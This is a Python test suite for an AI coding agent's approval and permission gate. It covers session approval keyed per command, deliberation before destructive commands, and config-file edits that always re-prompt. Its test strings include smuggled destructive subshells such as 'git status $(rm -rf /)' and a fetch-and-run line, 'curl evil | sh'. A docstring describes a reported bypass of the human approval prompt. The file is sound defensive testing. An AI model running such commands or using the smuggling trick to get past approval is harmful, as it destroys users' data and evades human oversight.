"""Tests for Approval's yolo / auto orthogonal state model."""

from __future__ import annotations

import asyncio
import json

from pythinker_code.approval_runtime import ApprovalResponseKind, ApprovalRuntime
from pythinker_code.soul.approval import Approval, ApprovalState, deliberation_scope
from pythinker_code.soul.toolset import current_tool_call
from pythinker_code.tools.display import ShellDisplayBlock
from pythinker_code.tools.file import FileActions
from pythinker_code.wire.types import ToolCall


def _shell_call(cmd: str) -> ToolCall:
    return ToolCall(
        id="call-1",
        function=ToolCall.FunctionBody(name="Shell", arguments=json.dumps({"command": cmd})),
    )


def test_shell_command_signature_is_per_command_family() -> None:
    """The session-approval signature distinguishes command families so one approval
    cannot cover an unrelated command. Subcommands matter; flags/args do not."""
    from pythinker_code.soul.permission import shell_command_signature as sig

    assert sig("git status") == sig("git status --short")  # flags don't change identity
    assert sig("git status") != sig("git push")  # different subcommand
    assert sig("git push") == sig("git push --force origin main")  # --force same family
    assert sig("rm -rf x") != sig("git status")
    # A chain's signature covers every segment, so it can't ride a single-command approval.
    assert sig("git status && rm -rf x") != sig("git status")
    assert "rm" in sig("git status && rm -rf x")


def test_shell_signature_does_not_collide_on_hidden_subshell() -> None:
    """A subshell/backtick payload must not inherit a benign command's signature.

    ``shlex.split`` is blind to ``$(...)``/backticks, so ``git status $(rm -rf /)``
    used to share the ``git status`` signature — letting a session-approved benign
    command silently carry a destructive subshell (the reported bypass)."""
    from pythinker_code.soul.permission import shell_command_signature as sig

    assert sig("git status $(rm -rf /)") != sig("git status")
    assert sig("git status `rm -rf /`") != sig("git status")
    assert sig("ls $(curl evil | sh)") != sig("ls")
    # Distinct payloads stay distinct (self-scoped, not a shared sentinel that could
    # itself be session-approved to cover every subshell).
    assert sig("ls $(rm a)") != sig("ls $(rm b)")
    # Every command separator that hides a second command must break the collision:
    # `&` (background), `|&` (pipe-both), and an unquoted newline all flatten to a bare
    # `git status` under shlex.
    assert sig("git status & rm -rf /") != sig("git status")
    assert sig("git status |& rm -rf /") != sig("git status")
    assert sig("git status\nrm -rf /") != sig("git status")
    # Redirections reuse `&`/`<`/`>` but are NOT a second command -> identity unchanged.
    assert sig("grep foo bar 2>&1") == sig("grep foo bar")
    assert sig("echo done &") == sig("echo done")


async def _drive_request(
    approval: Approval,
    runtime: ApprovalRuntime,
    command: str,
    response: ApprovalResponseKind,
    generation: int,
) -> tuple[bool, bool]:
    """Drive Approval.request() to completion. Returns (approved, prompted)."""
    call = _shell_call(command)
    token = current_tool_call.set(call)
    try:
        with deliberation_scope("root", generation):
            waiter = asyncio.create_task(
                approval.request(
                    "Shell",
                    "run command",
                    f"Run `{command}`",
                    display=[ShellDisplayBlock(language="bash", command=command)],
                )
            )
            prompted = False
            for _ in range(1000):
                if waiter.done():
                    break
                if pending := runtime.list_pending():
                    prompted = True
                    runtime.resolve(pending[0].id, response)
                    break
                await asyncio.sleep(0)
            result = await waiter
            return bool(result), prompted
    finally:
        current_tool_call.reset(token)


async def test_session_approval_per_command_and_destructive_backstop() -> None:
    """permgate-1: 'approve for session' is keyed per command family (1a) and never
    covers an irreversible call (1b)."""
    runtime = ApprovalRuntime()
    approval = Approval(state=ApprovalState())
    approval.set_runtime(runtime)

    # Approve a benign `git push` for the session.
    approved, prompted = await _drive_request(
        approval, runtime, "git push", "approve_for_session", 1
    )
    assert approved and prompted

    # A second plain `git push` is auto-approved without prompting.
    approved, prompted = await _drive_request(approval, runtime, "git push", "reject", 2)
    assert approved and not prompted

    # A DIFFERENT command is not covered by the per-command key -> prompts (1a).
    approved, prompted = await _drive_request(approval, runtime, "git status", "reject", 3)
    assert not approved and prompted

    # `git push --force` shares the `git push` signature but is destructive, so the
    # session approval must NOT cover it -> it re-prompts (1b).
    approved, prompted = await _drive_request(
        approval, runtime, "git push --force origin main", "reject", 4
    )
    assert not approved and prompted

    # A destructive command is never recorded as session-approved even via
    # "approve for session" — it degrades to a one-time approve (1b).
    approved, prompted = await _drive_request(
        approval, runtime, "rm -rf build", "approve_for_session", 5
    )
    assert approved and prompted
    approved, prompted = await _drive_request(approval, runtime, "rm -rf build", "reject", 6)
    assert not approved and prompted  # still prompts; not whitelisted


async def test_session_approval_does_not_carry_hidden_subshell() -> None:
    """permgate-1b: approving ``git status`` for the session must NOT auto-approve a
    ``git status $(...)`` that smuggles a hidden subshell — it re-prompts."""
    runtime = ApprovalRuntime()
    approval = Approval(state=ApprovalState())
    approval.set_runtime(runtime)

    approved, prompted = await _drive_request(
        approval, runtime, "git status", "approve_for_session", 1
    )
    assert approved and prompted

    # Sanity: an identical benign repeat is auto-approved without prompting.
    approved, prompted = await _drive_request(approval, runtime, "git status", "reject", 2)
    assert approved and not prompted

    # The subshell variant must not ride the session approval -> prompts (bypass closed).
    approved, prompted = await _drive_request(
        approval, runtime, "git status $(rm -rf /)", "reject", 3
    )
    assert not approved and prompted


def test_pending_approval_key_fails_closed_for_commandless_shell() -> None:
    """permgate-3: a Shell pending whose display lacks a command block must not collapse
    to the bare coarse action (which could alias an unrelated request). It fails closed
    to a scoped sentinel that can never equal a real per-command key."""
    from types import SimpleNamespace

    approval = Approval(state=ApprovalState())

    commandless = SimpleNamespace(sender="Shell", action="run command", display=[SimpleNamespace()])
    key = approval._pending_approval_key(commandless)  # pyright: ignore[reportArgumentType]

    assert key != "run command"  # not the coarse fallback that could over-match
    real = SimpleNamespace(
        sender="Shell",
        action="run command",
        display=[ShellDisplayBlock(language="bash", command="git status")],
    )
    # duck-typed record stand-in for the test
    assert key != approval._pending_approval_key(real)  # pyright: ignore[reportArgumentType]


async def test_one_time_approve_drains_identical_concurrent_siblings() -> None:
    """permgate-3: approving one of several byte-identical concurrent requests clears
    its identical siblings, but never a different command (or a destructive one)."""
    import contextvars

    runtime = ApprovalRuntime()
    approval = Approval(state=ApprovalState())
    approval.set_runtime(runtime)

    def _spawn(command: str, call_id: str) -> asyncio.Task[object]:
        call = ToolCall(
            id=call_id,
            function=ToolCall.FunctionBody(
                name="Shell", arguments=json.dumps({"command": command})
            ),
        )
        ctx = contextvars.copy_context()
        ctx.run(current_tool_call.set, call)
        return asyncio.create_task(
            approval.request(
                "Shell",
                "run command",
                f"Run `{command}`",
                display=[ShellDisplayBlock(language="bash", command=command)],
            ),
            context=ctx,
        )

    t_status_a = _spawn("git status", "c1")
    t_status_b = _spawn("git status", "c2")
    t_diff = _spawn("git diff", "c3")

    for _ in range(1000):
        if len(runtime.list_pending()) == 3:
            break
        await asyncio.sleep(0)
    assert len(runtime.list_pending()) == 3

    # Approve ONE `git status` (one-time). Its identical sibling must drain; `git diff` must not.
    status_pending = [p for p in runtime.list_pending() if "git status" in p.description]
    runtime.resolve(status_pending[0].id, "approve")
    res_a, res_b = await t_status_a, await t_status_b
    assert bool(res_a) and bool(res_b)

    remaining = runtime.list_pending()
    assert len(remaining) == 1 and "git diff" in remaining[0].description
    runtime.resolve(remaining[0].id, "reject")
    assert not bool(await t_diff)


def test_config_surface_classifier() -> None:
    """permgate-2: behavioral-config files are recognized; plan/scratch and source are not."""
    from pythinker_host.path import HostPath

    from pythinker_code.utils.path import is_config_surface_path

    for p in (
        "/repo/AGENTS.md",
        "/repo/sub/agents.md",
        "/repo/.pythinker/config.toml",
        "/repo/.pythinker/agents/x.yaml",
        "/repo/.claude/agents/r.yaml",
    ):
        assert is_config_surface_path(HostPath(p)), p
    for p in ("/repo/.pythinker/plans/x.md", "/repo/src/main.py", "/repo/README.md"):
        assert not is_config_surface_path(HostPath(p)), p


def test_config_surface_agents_md_scoped_to_injection_set() -> None:
    """permgate-2: when work_dir is known, every AGENTS.md on its ancestor chain
    (the set load_agents_md re-injects into the prompt) is a config surface — even
    when work_dir is a subdirectory and the file lives at the project root."""
    from pythinker_host.path import HostPath

    from pythinker_code.utils.path import is_config_surface_path

    # work_dir is a subdir; the project-root AGENTS.md is still re-injected, so it
    # must remain a config surface (regression: a work_dir-only anchor missed it).
    work_dir = HostPath("/repo/sub")
    for p in (
        "/repo/AGENTS.md",  # project-root ancestor — on the injection chain
        "/repo/sub/AGENTS.md",  # work_dir itself
        "/repo/sub/nested/agents.md",  # nested under work_dir (defense-in-depth)
    ):
        assert is_config_surface_path(HostPath(p), work_dir), p

    # A sibling tree's AGENTS.md is neither an ancestor of nor nested under
    # work_dir, so it is not part of the re-injected set.
    assert not is_config_surface_path(HostPath("/other/AGENTS.md"), work_dir)


async def test_config_edit_never_session_approvable_and_prompts_under_yolo() -> None:
    """permgate-2: a write to a config surface re-confirms every time — it is not
    auto-approved by yolo and never recorded as session-approved."""
    from pythinker_code.tools.file import FileActions

    def _write_call() -> ToolCall:
        return ToolCall(
            id="w1",
            function=ToolCall.FunctionBody(
                name="WriteFile",
                arguments=json.dumps({"path": "AGENTS.md", "content": "x", "mode": "overwrite"}),
            ),
        )

    async def _drive(
        approval: Approval, runtime: ApprovalRuntime, response: ApprovalResponseKind
    ) -> tuple[bool, bool]:
        token = current_tool_call.set(_write_call())
        try:
            waiter = asyncio.create_task(
                approval.request("WriteFile", FileActions.EDIT_CONFIG, "Write file `AGENTS.md`")
            )
            prompted = False
            for _ in range(1000):
                if waiter.done():
                    break
                if pending := runtime.list_pending():
                    prompted = True
                    runtime.resolve(pending[0].id, response)
                    break
                await asyncio.sleep(0)
            return bool(await waiter), prompted
        finally:
            current_tool_call.reset(token)

    # Under yolo, a config edit still prompts (not auto-approved).
    runtime = ApprovalRuntime()
    yolo = Approval(state=ApprovalState(yolo=True))
    yolo.set_runtime(runtime)
    approved, prompted = await _drive(yolo, runtime, "approve")
    assert approved and prompted

    # 'Approve for session' on a config edit does not record it -> the next one prompts again.
    runtime2 = ApprovalRuntime()
    approval = Approval(state=ApprovalState())
    approval.set_runtime(runtime2)
    approved, prompted = await _drive(approval, runtime2, "approve_for_session")
    assert approved and prompted
    assert approval._state.auto_approve_actions == set()
    approved, prompted = await _drive(approval, runtime2, "reject")
    assert not approved and prompted


def test_tool_destructive_reason_gates_background_shell() -> None:
    from pythinker_code.soul.permission import tool_destructive_reason

    # Background shell is the same "Shell" tool (run_in_background=true); a destructive
    # background command must still be classified as destructive.
    reason = tool_destructive_reason(
        "Shell", {"command": "rm -rf build", "run_in_background": True}
    )
    assert reason is not None


def test_tool_destructive_reason_ignores_unregistered_tool() -> None:
    from pythinker_code.soul.permission import tool_destructive_reason

    assert (
        tool_destructive_reason("WriteFile", {"path": "x", "content": "y", "mode": "overwrite"})
        is None
    )


def test_deliberation_scope_sets_and_restores_contextvar() -> None:
    from pythinker_code.soul.approval import (
        DeliberationScope,
        _current_deliberation_scope,
        deliberation_scope,
    )

    assert _current_deliberation_scope.get() is None
    with deliberation_scope("root", 3):
        assert _current_deliberation_scope.get() == DeliberationScope("root", 3)
    assert _current_deliberation_scope.get() is None


def test_yolo_only() -> None:
    approval = Approval(yolo=True)
    assert approval.is_yolo() is True
    assert approval.is_yolo_flag() is True
    assert approval.is_auto_approve() is True
    assert approval.is_auto() is False


def test_auto_only() -> None:
    state = ApprovalState(yolo=False, auto=True)
    approval = Approval(state=state)
    assert approval.is_auto_approve() is True
    assert approval.is_yolo() is False
    assert approval.is_yolo_flag() is False  # explicit flag only
    assert approval.is_auto() is True
    assert approval.is_auto_flag() is True


def test_yolo_and_auto() -> None:
    state = ApprovalState(yolo=True, auto=True)
    approval = Approval(state=state)
    assert approval.is_yolo() is True
    assert approval.is_auto_approve() is True
    assert approval.is_auto() is True


def test_neither_flag_set() -> None:
    approval = Approval(yolo=False)
    assert approval.is_yolo() is False
    assert approval.is_auto_approve() is False
    assert approval.is_auto() is False


def test_runtime_auto_only() -> None:
    state = ApprovalState(yolo=False, auto=False, runtime_auto=True)
    approval = Approval(state=state)
    assert approval.is_auto_approve() is True
    assert approval.is_yolo() is False
    assert approval.is_auto() is True
    assert approval.is_auto_flag() is False
    assert approval.is_runtime_auto() is True


def test_set_runtime_auto_does_not_trigger_on_change() -> None:
    fired: list[bool] = []
    state = ApprovalState(on_change=lambda: fired.append(True))
    approval = Approval(state=state)
    approval.set_runtime_auto(True)
    assert approval.is_auto() is True
    assert approval.is_auto_flag() is False
    assert fired == []


def test_set_yolo_does_not_touch_auto() -> None:
    state = ApprovalState(yolo=False, auto=True)
    approval = Approval(state=state)
    approval.set_yolo(True)
    assert approval.is_auto() is True
    assert approval.is_yolo() is True
    assert approval.is_auto_approve() is True
    approval.set_yolo(False)
    # Auto keeps auto-approve on even after the explicit yolo flag is cleared.
    assert approval.is_auto() is True
    assert approval.is_yolo() is False
    assert approval.is_auto_approve() is True


def test_shared_state_preserves_auto() -> None:
    state = ApprovalState(yolo=False, auto=True, runtime_auto=True)
    parent = Approval(state=state)
    child = parent.share()
    assert child.is_auto() is True
    assert child.is_yolo() is False
    assert child.is_auto_approve() is True
    assert child.is_runtime_auto() is True


def test_set_auto_toggles_with_on_change() -> None:
    """set_auto persists session auto and triggers on_change."""
    fired: list[bool] = []
    state = ApprovalState(yolo=False, auto=False, on_change=lambda: fired.append(True))
    approval = Approval(state=state)
    approval.set_auto(True)
    assert approval.is_auto() is True
    assert approval.is_auto_flag() is True
    assert fired == [True]
    approval.set_auto(False)
    assert approval.is_auto() is False
    assert approval.is_auto_flag() is False
    assert fired == [True, True]


def test_set_auto_false_clears_runtime_auto() -> None:
    state = ApprovalState(yolo=False, auto=False, runtime_auto=True)
    approval = Approval(state=state)
    assert approval.is_auto() is True
    approval.set_auto(False)
    assert approval.is_auto() is False
    assert approval.is_runtime_auto() is False


def test_destructive_action_deliberates_once_then_proceeds_under_auto() -> None:
    """auto + auto_deliberate: a destructive command deliberates the first time, the
    re-issue in a LATER generation runs once, and a fresh issue later deliberates again."""
    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    with deliberation_scope("root", 1):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    with deliberation_scope("root", 2):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is None
    with deliberation_scope("root", 3):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None


def test_same_generation_duplicate_destructive_calls_both_bounce() -> None:
    # Property (a): two byte-identical destructive calls in ONE generation both deliberate.
    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    with deliberation_scope("root", 1):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None


def test_subagent_identical_call_does_not_consume_main_one_shot() -> None:
    # Property (c): a subagent's identical call must not ride on the main agent's bounce.
    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    with deliberation_scope("root", 1):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    with deliberation_scope("sub-1", 1):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None


def test_older_generation_duplicate_destructive_call_still_bounces() -> None:
    # Defensive guard: only a strictly later generation can consume a prior bounce.
    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    with deliberation_scope("root", 2):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    with deliberation_scope("root", 1):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    with deliberation_scope("root", 2):
        assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None


def test_unscoped_destructive_calls_always_bounce_fail_closed() -> None:
    # No deliberation scope means no turn-boundary signal to authorize a retry. The gate
    # fails CLOSED: every sighting (including identical re-issues) bounces, never auto-
    # approving a destructive action it cannot prove was deliberated. Production always
    # binds a scope, so reaching this path is a wiring bug, not an expected flow.
    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    assert approval.deliberation_gate(_shell_call("rm -rf build")) is not None
    # Fail-closed bounce must not accumulate state for the unscoped path.
    assert approval._state.deliberated_fingerprints == {}


def test_deliberation_gate_conditions() -> None:
    """The gate fires when an irreversible action would be auto-approved and either no
    user is present (auto) or the deliberate flag is set."""
    rm = _shell_call("rm -rf x")
    safe = _shell_call("ls -la")

    # no user present (auto) -> the destructive backstop holds even with the flag off:
    # there is no human to veto, so the model must deliberate once first.
    unattended = Approval(state=ApprovalState(auto=True, auto_deliberate=False))
    assert unattended.deliberation_gate(rm) is not None

    # interactive yolo, flag off -> a user IS present (approvals merely skipped), so no
    # self-deliberation is forced.
    interactive_yolo = Approval(state=ApprovalState(yolo=True, auto=False, auto_deliberate=False))
    assert interactive_yolo.deliberation_gate(rm) is None

    # interactive yolo + flag on -> the flag EXTENDS deliberation to the user-present case.
    interactive_yolo_flag = Approval(
        state=ApprovalState(yolo=True, auto=False, auto_deliberate=True)
    )
    assert interactive_yolo_flag.deliberation_gate(rm) is not None

    # human present, no yolo/auto -> not auto-approved at all; normal approval shows the
    # rm -rf, so no self-deliberation is needed.
    human = Approval(state=ApprovalState(auto=False, auto_deliberate=True))
    assert human.deliberation_gate(rm) is None

    # yolo + auto -> gates AHEAD of the yolo bypass, flag or no flag
    yolo_auto = Approval(state=ApprovalState(yolo=True, auto=True, auto_deliberate=False))
    assert yolo_auto.deliberation_gate(rm) is not None

    # non-destructive when no user present -> proceeds untouched
    benign = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    assert benign.deliberation_gate(safe) is None


async def test_auto_safe_mode_denies_approval_without_waiting() -> None:
    """Unattended safe-mode runs fail closed instead of waiting forever for approval."""
    from tests.conftest import tool_call_context

    approval = Approval(state=ApprovalState(auto=True, safe_mode=True))
    with tool_call_context("Shell", arguments={"command": "echo hello"}):
        result = await asyncio.wait_for(
            approval.request("Shell", "run command", "Run command `echo hello`"),
            timeout=0.1,
        )

    assert not result
    assert approval.runtime.list_pending() == []
    error = result.rejection_error()
    assert "safe mode prevents auto-approval" in error.message
    assert "rejected by the user" not in error.message


async def test_trusted_auto_denies_outside_workspace_write_without_yolo() -> None:
    """Trusted auto mode still fails closed for outside-workspace file mutations."""
    from tests.conftest import tool_call_context

    approval = Approval(state=ApprovalState(auto=True, safe_mode=False))
    with tool_call_context("WriteFile", arguments={"path": "/tmp/out.txt", "content": "x"}):
        result = await asyncio.wait_for(
            approval.request("WriteFile", FileActions.EDIT_OUTSIDE, "Write file `/tmp/out.txt`"),
            timeout=0.1,
        )

    assert not result
    assert approval.runtime.list_pending() == []
    error = result.rejection_error()
    assert "Outside-workspace file changes require explicit approval" in error.message
    assert "rejected by the user" not in error.message


async def test_explicit_yolo_allows_outside_workspace_auto_write_boundary() -> None:
    from tests.conftest import tool_call_context

    approval = Approval(state=ApprovalState(auto=True, yolo=True, safe_mode=False))
    with tool_call_context("WriteFile", arguments={"path": "/tmp/out.txt", "content": "x"}):
        result = await approval.request(
            "WriteFile",
            FileActions.EDIT_OUTSIDE,
            "Write file `/tmp/out.txt`",
        )

    assert result


async def test_request_bounces_destructive_then_approves_retry() -> None:
    """End-to-end through request(): a destructive command in auto + auto_deliberate is
    bounced once with deliberation feedback that does NOT masquerade as a user rejection,
    then the identical retry auto-approves."""
    from tests.conftest import tool_call_context

    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=True))
    with tool_call_context("Shell", arguments={"command": "rm -rf build"}):
        with deliberation_scope("root", 1):
            first = await approval.request("Shell", "run command", "Run command `rm -rf build`")
        assert not first, "destructive action is bounced for deliberation"
        assert first.deliberation is True
        assert "irreversible" in first.feedback
        assert "rejected by the user" not in first.rejection_error().message

        with deliberation_scope("root", 2):
            second = await approval.request("Shell", "run command", "Run command `rm -rf build`")
        assert second, "one-shot consumed in a later generation: the deliberated retry runs"


async def test_request_bounces_destructive_background_shell_under_default_auto() -> None:
    """B1 end-to-end on the path it actually changed: plain auto with the deliberate flag
    OFF (the default). A destructive BACKGROUND shell still bounces once and then runs on
    the deliberated retry -- it does NOT hit the fail-closed unscoped branch, because the
    approval is requested inline at tool-call time, inside the step's deliberation scope,
    before the background task is spawned."""
    from tests.conftest import tool_call_context

    approval = Approval(state=ApprovalState(auto=True, auto_deliberate=False))
    args = {"command": "rm -rf build", "run_in_background": True}
    with tool_call_context("Shell", arguments=args):
        with deliberation_scope("root", 1):
            first = await approval.request("Shell", "run command", "Run command `rm -rf build`")
        assert not first, "default-auto destructive bg shell is bounced for deliberation"
        assert first.deliberation is True

        with deliberation_scope("root", 2):
            second = await approval.request("Shell", "run command", "Run command `rm -rf build`")
        assert second, "deliberated retry in a later generation runs (no fail-closed loop)"


def test_approval_state_honors_auto_deliberate_flag() -> None:
    # With no user present (auto) the destructive backstop is always on, so the flag's
    # distinct effect is on the INTERACTIVE-yolo case (a user is present, approvals skipped).
    on = Approval(state=ApprovalState(yolo=True, auto=False, auto_deliberate=True))
    assert on.deliberation_gate(_shell_call("rm -rf build")) is not None
    off = Approval(state=ApprovalState(yolo=True, auto=False, auto_deliberate=False))
    assert off.deliberation_gate(_shell_call("rm -rf build")) is None
